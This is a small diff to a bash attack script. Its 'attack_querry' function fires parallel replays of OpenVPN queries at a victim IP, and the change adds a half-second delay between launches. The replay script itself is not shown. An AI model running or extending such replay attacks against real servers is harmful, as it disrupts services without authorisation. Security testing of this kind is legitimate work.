@@ -80,6 +80,7 @@ attack_querry() {
             tmp_dir=`mktemp -d -p $(pwd)`
             for i in {1..9}; do
             bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR &
+            sleep 0.5
             done
             bash replay_openvpn_querry.sh $VICTIM_IP $LOOPS $TEMP_DIR
             rm -r $tmp_dir
